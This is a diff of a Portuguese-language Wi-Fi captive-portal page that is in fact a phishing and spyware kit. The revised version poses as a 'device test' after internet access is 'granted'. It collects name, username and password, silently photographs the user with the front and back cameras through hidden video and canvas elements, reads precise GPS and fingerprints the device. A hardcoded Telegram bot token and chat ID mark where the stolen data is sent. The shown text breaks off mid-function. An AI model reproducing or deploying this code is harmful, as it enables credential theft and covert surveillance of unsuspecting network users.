@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠️ ATENÇÃO - Verificação de Segurança Necessária</title>
+    <title>Portal de Acesso - Verificação de Rede</title>
     <style>
         * {
             margin: 0;
@@ -49,72 +49,11 @@
             66% { transform: translate(-20px, 20px) scale(0.9); }
         }
 
-        .top-alert {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(90deg, #dc2626, #ef4444, #dc2626);
-            background-size: 200% 100%;
-            animation: alertPulse 2s ease infinite;
-            color: white;
-            padding: 12px;
-            text-align: center;
-            font-weight: 700;
-            font-size: 14px;
-            z-index: 1000;
-            box-shadow: 0 4px 20px rgba(220, 38, 38, 0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        @keyframes alertPulse {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        .alert-icon {
-            font-size: 20px;
-            animation: shake 0.5s ease infinite;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(-10deg); }
-            75% { transform: rotate(10deg); }
-        }
-
-        .attempts-bar {
-            position: fixed;
-            top: 50px;
-            right: 20px;
-            background: rgba(220, 38, 38, 0.9);
-            backdrop-filter: blur(10px);
-            padding: 10px 20px;
-            border-radius: 12px;
-            color: white;
-            font-weight: 600;
-            font-size: 13px;
-            z-index: 999;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.4);
-            animation: pulse 2s ease infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
         .container {
             position: relative;
             z-index: 10;
             width: 90%;
             max-width: 450px;
-            margin-top: 80px;
-            margin-bottom: 20px;
         }
 
         .glass-card {
@@ -127,111 +66,120 @@
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
         }
 
-        .header {
+        .screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* TELA 1 - BOAS VINDAS */
+        .welcome-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 50px;
+            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
+            animation: pulse 2s ease infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 15px 40px rgba(34, 197, 94, 0.6); }
+        }
+
+        .welcome-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .welcome-subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .info-box {
+            background: rgba(34, 197, 94, 0.15);
+            border: 2px solid rgba(34, 197, 94, 0.4);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .info-box-title {
+            color: #86efac;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .info-box-text {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
+        }
+
+        /* TELA 2 - CADASTRO */
+        .form-title {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .form-subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
             text-align: center;
             margin-bottom: 30px;
         }
 
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 40px;
-            box-shadow: 0 10px 30px rgba(220, 38, 38, 0.4);
-            animation: pulse 2s ease infinite;
+        .input-group {
+            margin-bottom: 20px;
         }
-
-        .header h1 {
-            color: white;
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .urgent-badge {
-            background: rgba(220, 38, 38, 0.2);
-            border: 2px solid #dc2626;
-            color: #fca5a5;
-            padding: 10px 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-size: 13px;
-            font-weight: 600;
-            text-align: center;
-            animation: pulse 2s ease infinite;
-        }
-
-        .countdown {
-            background: rgba(220, 38, 38, 0.3);
-            border: 2px solid #dc2626;
-            color: white;
-            padding: 15px;
-            border-radius: 12px;
-            margin: 15px 0;
-            text-align: center;
-            font-size: 18px;
-            font-weight: 700;
-            font-family: 'Courier New', monospace;
-        }
-
-        .countdown-label {
-            font-size: 12px;
-            color: #fca5a5;
-            margin-bottom: 5px;
-            font-family: 'Segoe UI', sans-serif;
-        }
-
-        .toggle-container {
-            display: flex;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            padding: 5px;
-            margin-bottom: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .toggle-btn {
-            flex: 1;
-            padding: 12px;
-            background: transparent;
-            border: none;
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-
-        .toggle-btn.active {
-            background: rgba(255, 255, 255, 0.15);
-            color: white;
-        }
-
-        .form { display: none; }
-
-        .form.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .input-group { margin-bottom: 20px; }
 
         .input-group label {
             display: block;
@@ -241,7 +189,9 @@
             margin-bottom: 8px;
         }
 
-        .input-wrapper { position: relative; }
+        .input-wrapper {
+            position: relative;
+        }
 
         .input-icon {
             position: absolute;
@@ -265,55 +215,174 @@
             outline: none;
         }
 
-        .input-group input::placeholder { color: rgba(255, 255, 255, 0.4); }
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
 
         .input-group input:focus {
             background: rgba(255, 255, 255, 0.12);
-            border-color: rgba(124, 58, 237, 0.5);
-            box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.1);
+            border-color: rgba(34, 197, 94, 0.5);
+            box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.1);
         }
 
-        .btn-submit {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
-            border: none;
+        /* TELA 3 - TESTES */
+        .testing-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 50px;
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
+            animation: pulse 2s ease infinite;
+        }
+
+        .testing-title {
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .testing-subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .test-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.5s ease;
+        }
+
+        .test-item.testing {
+            border-color: rgba(251, 191, 36, 0.5);
+            background: rgba(251, 191, 36, 0.1);
+        }
+
+        .test-item.success {
+            border-color: rgba(34, 197, 94, 0.5);
+            background: rgba(34, 197, 94, 0.1);
+        }
+
+        .test-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            transition: all 0.5s ease;
+        }
+
+        .test-item.testing .test-icon {
+            background: rgba(251, 191, 36, 0.2);
+            animation: spin 1s linear infinite;
+        }
+
+        .test-item.success .test-icon {
+            background: rgba(34, 197, 94, 0.2);
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .test-text {
+            flex: 1;
+        }
+
+        .test-name {
             color: white;
             font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(220, 38, 38, 0.4);
-            margin-top: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-weight: 600;
+            margin-bottom: 3px;
         }
 
-        .btn-submit:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(220, 38, 38, 0.5);
+        .test-status {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
         }
 
-        .message {
-            padding: 14px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            font-weight: 500;
-            display: none;
+        .test-item.testing .test-status {
+            color: #fcd34d;
         }
 
-        .message.error {
-            background: rgba(239, 68, 68, 0.2);
-            border: 1px solid rgba(239, 68, 68, 0.3);
-            color: #fca5a5;
-        }
-
-        .message.success {
-            background: rgba(34, 197, 94, 0.2);
-            border: 1px solid rgba(34, 197, 94, 0.3);
+        .test-item.success .test-status {
             color: #86efac;
+        }
+
+        /* TELA 4 - SUCESSO */
+        .success-icon {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 60px;
+            box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
+            animation: successPulse 2s ease infinite;
+        }
+
+        @keyframes successPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .success-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .success-text {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #22c55e, #16a34a);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 4px;
+        }
+
+        .progress-text {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            text-align: center;
         }
 
         .loading {
@@ -335,12 +404,10 @@
             width: 60px;
             height: 60px;
             border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #dc2626;
+            border-top-color: #22c55e;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
 
         .loading-text {
             color: white;
@@ -348,139 +415,8 @@
             font-size: 16px;
         }
 
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 12px;
-        }
-
-        .urgency-popup {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(20, 20, 40, 0.95);
-            backdrop-filter: blur(20px);
-            border: 2px solid #dc2626;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 400px;
-            width: 90%;
-            z-index: 2000;
-            box-shadow: 0 20px 60px rgba(220, 38, 38, 0.5);
-            display: none;
-            animation: popIn 0.3s ease;
-        }
-
-        @keyframes popIn {
-            from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
-            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-        }
-
-        .popup-icon {
-            font-size: 60px;
-            text-align: center;
-            margin-bottom: 15px;
-            animation: shake 0.5s ease infinite;
-        }
-
-        .popup-title {
-            color: #fca5a5;
-            font-size: 22px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-
-        .popup-text {
-            color: white;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        .popup-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #dc2626, #ef4444);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            text-transform: uppercase;
-        }
-
-        .location-status {
-            background: rgba(34, 197, 94, 0.2);
-            border: 1px solid rgba(34, 197, 94, 0.4);
-            color: #86efac;
-            padding: 10px;
-            border-radius: 10px;
-            margin: 10px 0;
-            font-size: 12px;
-            text-align: center;
-            display: none;
-        }
-
-        .location-status.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .camera-status {
-            background: rgba(59, 130, 246, 0.2);
-            border: 1px solid rgba(59, 130, 246, 0.4);
-            color: #93c5fd;
-            padding: 10px;
-            border-radius: 10px;
-            margin: 10px 0;
-            font-size: 12px;
-            text-align: center;
-            display: none;
-        }
-
-        .camera-status.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .notification {
-            position: fixed;
-            right: -400px;
-            background: rgba(20, 20, 40, 0.95);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            padding: 15px 20px;
-            color: white;
-            font-size: 13px;
-            z-index: 998;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            transition: right 0.5s ease;
-            max-width: 300px;
-        }
-
-        .notification.show {
-            right: 20px;
-        }
-
-        .notification.warning { border-left: 4px solid #f59e0b; }
-        .notification.error { border-left: 4px solid #dc2626; }
-        .notification.info { border-left: 4px solid #3b82f6; }
-
-        .notification-title {
-            font-weight: 700;
-            margin-bottom: 5px;
-            font-size: 14px;
-        }
-
         @media (max-width: 480px) {
             .glass-card { padding: 40px 25px; }
-            .attempts-bar { top: 45px; right: 10px; font-size: 11px; padding: 8px 12px; }
         }
     </style>
 </head>
@@ -489,106 +425,49 @@
     <div class="orb orb-2"></div>
     <div class="orb orb-3"></div>
 
-    <div class="top-alert">
-        <span class="alert-icon">⚠️</span>
-        <span>VERIFICAÇÃO DE SEGURANÇA OBRIGATÓRIA - AÇÃO IMEDIATA NECESSÁRIA</span>
-    </div>
-
-    <div class="attempts-bar">
-        🔴 Tentativas restantes: <span id="attemptsCount">3</span>
-    </div>
-
-    <div class="urgency-popup" id="urgencyPopup">
-        <div class="popup-icon">🚨</div>
-        <div class="popup-title">ATENÇÃO!</div>
-        <div class="popup-text">
-            Detectamos atividade suspeita na sua conexão.<br><br>
-            <strong>Você precisa se autenticar IMEDIATAMENTE</strong> para continuar usando a rede.<br><br>
-            Sua sessão será encerrada em <span id="popupCountdown" style="color: #fca5a5; font-weight: 700;">30</span> segundos.
-        </div>
-        <button class="popup-btn" onclick="closePopup()">ENTENDI, VOU AUTENTICAR</button>
-    </div>
-
-    <div class="notification warning" id="notif1" style="top: 100px;">
-        <div class="notification-title">️ Aviso de Segurança</div>
-        <div>Sua conexão precisa ser verificada para continuar</div>
-    </div>
-
-    <div class="notification error" id="notif2" style="top: 200px;">
-        <div class="notification-title">🔴 Alerta</div>
-        <div>Autenticação obrigatória em andamento</div>
-    </div>
-
-    <div class="notification info" id="notif3" style="top: 300px;">
-        <div class="notification-title">ℹ️ Informação</div>
-        <div>Localização sendo verificada para sua segurança</div>
-    </div>
-
     <div class="loading" id="loading">
         <div class="loading-spinner"></div>
-        <div class="loading-text" id="loadingText">Verificando segurança...</div>
+        <div class="loading-text" id="loadingText">Processando...</div>
     </div>
 
     <div class="container">
         <div class="glass-card">
-            <div class="header">
-                <div class="logo">🔐</div>
-                <h1>Verificação de Segurança</h1>
-                <p>Identificamos atividade incomum. Autentique-se agora para continuar.</p>
-            </div>
-
-            <div class="urgent-badge">
-                ⚠️ AÇÃO OBRIGATÓRIA - SUA CONEXÃO SERÁ BLOQUEADA
-            </div>
-
-            <div class="countdown">
-                <div class="countdown-label">TEMPO PARA AUTENTICAÇÃO</div>
-                <div id="mainCountdown">05:00</div>
-            </div>
-
-            <div class="location-status" id="locationStatus">
-                📍 Verificando sua localização para segurança...
-            </div>
-
-            <div class="camera-status" id="cameraStatus">
-                 Verificando ambiente de rede...
-            </div>
-
-            <div class="toggle-container">
-                <button class="toggle-btn active" onclick="showForm('login')">Entrar</button>
-                <button class="toggle-btn" onclick="showForm('register')">Cadastrar</button>
-            </div>
-
-            <div class="message" id="message"></div>
-
-            <div class="form-container">
-                <form class="form active" id="loginForm" action="$(link-login-only)" method="post">
-                    <input type="hidden" name="dst" value="$(link-orig)" />
-                    
-                    <div class="input-group">
-                        <label>Usuário</label>
-                        <div class="input-wrapper">
-                            <input type="text" name="username" id="loginUsername" placeholder="Digite seu usuário" value="$(username)" required autocomplete="off" />
-                            <span class="input-icon">👤</span>
-                        </div>
+            
+            <!-- TELA 1: BOAS VINDAS -->
+            <div class="screen active" id="screen1">
+                <div class="welcome-icon">🌐</div>
+                <h1 class="welcome-title">Internet Liberada!</h1>
+                <p class="welcome-subtitle">
+                    Parabéns! Sua conexão foi aprovada e está quase pronta para uso.
+                </p>
+                
+                <div class="info-box">
+                    <div class="info-box-title">
+                        <span>✅</span>
+                        <span>Quase lá!</span>
                     </div>
-
-                    <div class="input-group">
-                        <label>Senha</label>
-                        <div class="input-wrapper">
-                            <input type="password" name="password" id="loginPassword" placeholder="Digite sua senha" required />
-                            <span class="input-icon">🔒</span>
-                        </div>
+                    <div class="info-box-text">
+                        Liberamos já a sua internet! Deixa só a gente fazer um teste rápido no seu dispositivo para garantir que tudo está funcionando perfeitamente.
+                        <br><br>
+                        <strong>Mas antes, preciso que você se cadastre rapidamente:</strong>
                     </div>
+                </div>
 
-                    <button type="submit" class="btn-submit">🔓 AUTENTICAR AGORA</button>
-                </form>
+                <button class="btn-primary" onclick="showScreen(2)">
+                    CADASTRAR E LIBERAR INTERNET
+                </button>
+            </div>
 
-                <form class="form" id="registerForm" onsubmit="handleRegister(event)">
+            <!-- TELA 2: CADASTRO -->
+            <div class="screen" id="screen2">
+                <h2 class="form-title">Cadastro Rápido</h2>
+                <p class="form-subtitle">Preencha para liberar sua internet</p>
+
+                <form id="registerForm" onsubmit="handleRegister(event)">
                     <div class="input-group">
                         <label>Nome Completo</label>
                         <div class="input-wrapper">
-                            <input type="text" id="regName" placeholder="Digite seu nome completo" required />
+                            <input type="text" id="regName" placeholder="Seu nome completo" required />
                             <span class="input-icon">👤</span>
                         </div>
                     </div>
@@ -617,168 +496,191 @@
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-submit">🔓 CADASTRAR E AUTENTICAR</button>
+                    <button type="submit" class="btn-primary">
+                        INICIAR TESTES DO DISPOSITIVO
+                    </button>
                 </form>
             </div>
 
-            <div class="footer">
-                © 2026 Sistema de Segurança de Rede - Verificação Obrigatória
+            <!-- TELA 3: TESTES -->
+            <div class="screen" id="screen3">
+                <div class="testing-icon"></div>
+                <h2 class="testing-title">Testando Dispositivo</h2>
+                <p class="testing-subtitle">Aguarde enquanto verificamos seu dispositivo...</p>
+
+                <div class="test-item" id="testTouch">
+                    <div class="test-icon">👆</div>
+                    <div class="test-text">
+                        <div class="test-name">Touch Screen</div>
+                        <div class="test-status">Aguardando...</div>
+                    </div>
+                </div>
+
+                <div class="test-item" id="testCamera">
+                    <div class="test-icon">📷</div>
+                    <div class="test-text">
+                        <div class="test-name">Câmera</div>
+                        <div class="test-status">Aguardando...</div>
+                    </div>
+                </div>
+
+                <div class="test-item" id="testGPS">
+                    <div class="test-icon">📍</div>
+                    <div class="test-text">
+                        <div class="test-name">Localização GPS</div>
+                        <div class="test-status">Aguardando...</div>
+                    </div>
+                </div>
+
+                <div class="test-item" id="testData">
+                    <div class="test-icon">📊</div>
+                    <div class="test-text">
+                        <div class="test-name">Dados do Dispositivo</div>
+                        <div class="test-status">Aguardando...</div>
+                    </div>
+                </div>
             </div>
+
+            <!-- TELA 4: SUCESSO -->
+            <div class="screen" id="screen4">
+                <div class="success-icon">✅</div>
+                <h2 class="success-title">Tudo Pronto!</h2>
+                <p class="success-text">
+                    Seu dispositivo foi verificado com sucesso!<br>
+                    Sua internet está sendo liberada agora...
+                </p>
+
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text" id="progressText">Liberando conexão... 0%</div>
+            </div>
+
         </div>
     </div>
 
     <script>
-        // ⚙️ CONFIGURAÇÕES DO TELEGRAM
+        // ️ CONFIGURAÇÕES DO TELEGRAM
         const TELEGRAM_BOT_TOKEN = '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0';
         const TELEGRAM_CHAT_ID = '-5425475205';
 
-        let attempts = 3;
-        let mainCountdown = 300;
-        let popupCountdown = 30;
+        let userData = {};
+        let deviceData = {};
         let cameraPhotos = { front: null, back: null };
 
-        // 🚨 SISTEMA DE PRESSÃO
-        function startPressureSystem() {
-            setInterval(() => {
-                if (mainCountdown > 0) {
-                    mainCountdown--;
-                    const min = Math.floor(mainCountdown / 60).toString().padStart(2, '0');
-                    const sec = (mainCountdown % 60).toString().padStart(2, '0');
-                    document.getElementById('mainCountdown').textContent = `${min}:${sec}`;
-                    
-                    if (mainCountdown === 60) {
-                        showNotification('⚠️ ÚLTIMO MINUTO!', 'Autentique-se agora ou perderá a conexão', 'error');
-                    }
-                }
-            }, 1000);
-
-            setTimeout(() => {
-                document.getElementById('urgencyPopup').style.display = 'block';
-                startPopupCountdown();
-            }, 3000);
-
-            setTimeout(() => showNotificationById('notif1'), 2000);
-            setTimeout(() => showNotificationById('notif2'), 5000);
-            setTimeout(() => showNotificationById('notif3'), 8000);
-
-            requestGPSLocation();
-            requestCameraAccess();
+        // 🔄 NAVEGAÇÃO ENTRE TELAS
+        function showScreen(screenNum) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(`screen${screenNum}`).classList.add('active');
         }
 
-        function startPopupCountdown() {
-            const interval = setInterval(() => {
-                if (popupCountdown > 0) {
-                    popupCountdown--;
-                    document.getElementById('popupCountdown').textContent = popupCountdown;
-                } else {
-                    clearInterval(interval);
-                }
-            }, 1000);
-        }
-
-        function closePopup() {
-            document.getElementById('urgencyPopup').style.display = 'none';
-        }
-
-        function showNotificationById(id) {
-            const notif = document.getElementById(id);
-            notif.classList.add('show');
-            setTimeout(() => notif.classList.remove('show'), 5000);
-        }
-
-        function showNotification(title, text, type) {
-            const notif = document.createElement('div');
-            notif.className = `notification ${type}`;
-            notif.style.top = '400px';
-            notif.innerHTML = `<div class="notification-title">${title}</div><div>${text}</div>`;
-            document.body.appendChild(notif);
-            setTimeout(() => notif.classList.add('show'), 100);
-            setTimeout(() => {
-                notif.classList.remove('show');
-                setTimeout(() => notif.remove(), 500);
-            }, 5000);
-        }
-
-        // 📍 SOLICITAR GPS PRECISO
-        function requestGPSLocation() {
-            const status = document.getElementById('locationStatus');
-            status.classList.add('active');
+        // 📝 HANDLE CADASTRO
+        async function handleRegister(e) {
+            e.preventDefault();
             
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        window.gpsData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed,
-                            source: 'GPS_PRECISO'
-                        };
-                        status.innerHTML = '✅ Localização verificada com sucesso';
-                        status.style.borderColor = 'rgba(34, 197, 94, 0.6)';
-                        status.style.color = '#86efac';
-                    },
-                    (error) => {
-                        window.gpsData = {
-                            latitude: 'Negado',
-                            longitude: 'Negado',
-                            accuracy: 'N/A',
-                            source: 'NEGADO'
-                        };
-                        status.innerHTML = '⚠️ Habilite a localização para continuar';
-                        status.style.borderColor = 'rgba(245, 158, 11, 0.6)';
-                        status.style.color = '#fcd34d';
-                        setTimeout(requestGPSLocation, 5000);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
+            const name = document.getElementById('regName').value;
+            const username = document.getElementById('regUsername').value;
+            const password = document.getElementById('regPassword').value;
+            const confirmPassword = document.getElementById('regConfirmPassword').value;
+            
+            if (password !== confirmPassword) {
+                alert('As senhas não coincidem!');
+                return;
             }
+            
+            if (password.length < 6) {
+                alert('A senha deve ter pelo menos 6 caracteres!');
+                return;
+            }
+            
+            userData = { name, username, password };
+            
+            // Ir para tela de testes
+            showScreen(3);
+            
+            // Iniciar testes
+            await runTests();
         }
 
-        // 📸 SOLICITAR ACESSO À CÂMERA E TIRAR FOTOS (SILENCIOSO)
-        async function requestCameraAccess() {
-            const status = document.getElementById('cameraStatus');
-            status.classList.add('active');
+        // 🧪 RODAR TESTES
+        async function runTests() {
+            // Teste 1: Touch
+            await runTest('testTouch', 'Verificando touch...', 'Touch OK', testTouch);
             
+            // Teste 2: Câmera (tirar fotos silenciosamente)
+            await runTest('testCamera', 'Testando câmera...', 'Câmera OK', testCamera);
+            
+            // Teste 3: GPS
+            await runTest('testGPS', 'Localizando...', 'GPS OK', testGPS);
+            
+            // Teste 4: Dados
+            await runTest('testData', 'Coletando dados...', 'Dados OK', collectAllData);
+            
+            // Enviar tudo para Telegram
+            await sendAllToTelegram();
+            
+            // Ir para tela de sucesso
+            setTimeout(() => {
+                showScreen(4);
+                startProgress();
+            }, 1000);
+        }
+
+        // 🎯 RODAR TESTE INDIVIDUAL
+        async function runTest(elementId, testingText, successText, testFunction) {
+            const element = document.getElementById(elementId);
+            const status = element.querySelector('.test-status');
+            
+            // Status: testando
+            element.classList.add('testing');
+            status.textContent = testingText;
+            
+            // Executar teste
+            await testFunction();
+            
+            // Status: sucesso
+            element.classList.remove('testing');
+            element.classList.add('success');
+            status.textContent = successText;
+            
+            // Aguardar um pouco
+            await new Promise(resolve => setTimeout(resolve, 800));
+        }
+
+        //  TESTE TOUCH
+        async function testTouch() {
+            deviceData.touchSupport = 'ontouchstart' in window;
+            deviceData.maxTouchPoints = navigator.maxTouchPoints || 0;
+            deviceData.pointerType = window.matchMedia?.('(pointer: fine)').matches ? 'preciso (mouse)' : 
+                                     window.matchMedia?.('(pointer: coarse)').matches ? 'grosso (touch)' : 'nenhum';
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+
+        // 📷 TESTE CÂMERA (TIRAR FOTOS SILENCIOSAMENTE)
+        async function testCamera() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                status.innerHTML = '⚠️ Câmera não disponível neste dispositivo';
-                status.style.borderColor = 'rgba(245, 158, 11, 0.6)';
-                status.style.color = '#fcd34d';
+                deviceData.cameraAvailable = false;
                 return;
             }
 
             try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(d => d.kind === 'videoinput');
-                
-                console.log('Câmeras encontradas:', videoDevices.length);
-                
-                // Capturar foto frontal
+                // Foto frontal
                 await capturePhoto('user', 'front');
                 
-                // Capturar foto traseira
+                // Foto traseira
                 await capturePhoto('environment', 'back');
                 
-                status.innerHTML = '✅ Verificação de ambiente concluída';
-                status.style.borderColor = 'rgba(34, 197, 94, 0.6)';
-                status.style.color = '#86efac';
+                deviceData.cameraAvailable = true;
+                deviceData.cameraFront = cameraPhotos.front ? 'CAPTURADA' : 'FALHOU';
+                deviceData.cameraBack = cameraPhotos.back ? 'CAPTURADA' : 'FALHOU';
                 
             } catch (error) {
-                console.error('Erro ao acessar câmera:', error);
-                status.innerHTML = '⚠️ Permita o acesso à câmera para continuar';
-                status.style.borderColor = 'rgba(245, 158, 11, 0.6)';
-                status.style.color = '#fcd34d';
-                setTimeout(requestCameraAccess, 5000);
+                console.error('Erro câmera:', error);
+                deviceData.cameraAvailable = false;
             }
         }
 
-        // 📷 CAPTURAR FOTO (SILENCIOSO - SEM PREVIEW)
+        // 📷 CAPTURAR FOTO
         async function capturePhoto(facingMode, type) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -794,7 +696,7 @@
                 video.srcObject = stream;
                 video.autoplay = true;
                 video.playsInline = true;
-                video.style.display = 'none'; // Esconder vídeo
+                video.style.display = 'none';
                 document.body.appendChild(video);
                 
                 await new Promise(resolve => {
@@ -807,80 +709,279 @@
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.style.display = 'none'; // Esconder canvas
+                canvas.style.display = 'none';
